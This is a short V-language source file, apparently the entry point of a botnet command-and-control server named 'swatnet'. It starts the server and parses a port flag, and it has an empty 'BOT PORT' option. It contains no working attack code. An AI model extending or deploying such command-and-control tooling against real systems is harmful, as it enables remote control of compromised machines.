import os

import core.cnc

fn main() {
	mut args := os.args.clone()
	mut s := cnc.start_swatnet()
	for i, arg in args {
		match arg {
			"-p" {
				s.port = args[i+1]
			}
			"-bp" {
				// BOT PORT
			} else {}
		}
	}
}